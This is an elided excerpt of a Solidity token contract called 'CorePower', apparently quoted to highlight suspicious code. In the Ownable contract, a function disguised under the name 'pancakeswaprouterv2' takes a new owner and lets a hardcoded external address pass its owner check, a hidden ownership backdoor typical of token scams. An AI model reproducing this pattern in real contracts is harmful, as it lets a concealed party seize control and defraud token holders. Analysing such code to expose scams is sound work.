...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xbed7687E198f3122F948827aC5D83833f69910C0));
...
contract CorePower is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "CorePower";
  string private _name = "CorePower";
